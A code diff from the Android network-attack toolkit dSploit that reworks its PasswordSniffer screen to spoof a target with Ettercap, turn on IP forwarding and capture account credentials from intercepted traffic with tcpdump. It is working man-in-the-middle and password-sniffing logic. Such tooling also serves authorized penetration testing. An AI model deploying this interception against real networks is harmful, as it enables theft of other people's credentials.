@@ -24,15 +24,14 @@ import java.util.HashMap;
 import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.net.Stream;
 import it.evilsocket.dsploit.system.Environment;
-import it.evilsocket.dsploit.system.Shell.OutputReceiver;
-import it.evilsocket.dsploit.tools.ArpSpoof;
+import it.evilsocket.dsploit.tools.Ettercap;
+import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
 import it.evilsocket.dsploit.tools.TcpDump;
 import it.evilsocket.dsploit.tools.TcpDump.PasswordReceiver;
 import android.app.Activity;
 import android.content.Context;
 import android.graphics.Typeface;
 import android.os.Bundle;
-import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.ViewGroup;
@@ -51,7 +50,7 @@ public class PasswordSniffer extends Activity
 	private ExpandableListView mListView		  = null;		
 	private ListViewAdapter	   mAdapter			  = null;
 	private boolean	           mRunning			  = false;	
-	private ArpSpoof           mArpSpoof		  = null;
+	private Ettercap           mEttercap		  = null;
 	private TcpDump	           mTcpDump			  = null;
 	
 	public class ListViewAdapter extends BaseExpandableListAdapter
@@ -178,7 +177,7 @@ public class PasswordSniffer extends Activity
         
         mListView.setAdapter( mAdapter );
 
-        mArpSpoof = new ArpSpoof( this );
+        mEttercap = new Ettercap( this );
         mTcpDump  = new TcpDump( this );
                 
         mSniffToggleButton.setOnClickListener( new OnClickListener(){
@@ -197,7 +196,7 @@ public class PasswordSniffer extends Activity
 	}
 
 	private void setStoppedState( ) {		
-		mArpSpoof.kill();
+		mEttercap.kill();
 		mTcpDump.kill();
 
 		Environment.setForwarding( false );
@@ -210,54 +209,34 @@ public class PasswordSniffer extends Activity
 
 	private void setStartedState( ) {		
 		// never say never :)
-		mArpSpoof.kill();
+		mEttercap.kill();
 		mTcpDump.kill();
 		
-		final ArpSpoof spoof = mArpSpoof;
+		final Ettercap spoof = mEttercap;
 		final TcpDump  dump  = mTcpDump;
 		
-		Environment.setForwarding( true );
-		
-		OutputReceiver receiver = new OutputReceiver(){
+		spoof.spoof( Environment.getTarget(), new OnReadyListener(){
 			@Override
-			public void onStart(String command) {
-				Log.d( "ARPSPOOF", "ArpSpoof started." );
-			}
+			public void onReady() {
+				Environment.setForwarding( true );
 
-			@Override
-			public void onNewLine( String line ) {
-				// arpspoof sometimes goes segfault, restart it just in case :P
-				if( line.trim().toLowerCase().contains("segmentation fault") )
-				{
-					Log.w( "ARPSPOOF", "Restarting arpspoof after SEGFAULT" );
-					spoof.kill();
-					spoof.spoof( Environment.getTarget(), this ).start();
-				}
-			}
-
-			@Override
-			public void onEnd(int exitCode) { 
-				Log.w( "ARPSPOOF", "Ended with code " + exitCode );
-			}
-		};
-			
-		spoof.spoof( Environment.getTarget(), receiver ).start();
-		
-		dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
-			@Override
-			public void onAccountFound( final Stream stream, final String data ) {
-				
-				PasswordSniffer.this.runOnUiThread( new Runnable() {
+				dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
 					@Override
-					public void run()
-					{												
-						mAdapter.addChild( stream.endpoint.toString(), data );
-					}							
-				});				
+					public void onAccountFound( final Stream stream, final String data ) {
+						
+						PasswordSniffer.this.runOnUiThread( new Runnable() {
+							@Override
+							public void run()
+							{												
+								mAdapter.addChild( stream.endpoint.toString(), data );
+							}							
+						});				
+					}
+					
+				}).start();
 			}
-			
 		}).start();
-		
+					
 		mSniffProgress.setVisibility( View.VISIBLE );
 		mRunning = true;
 	}
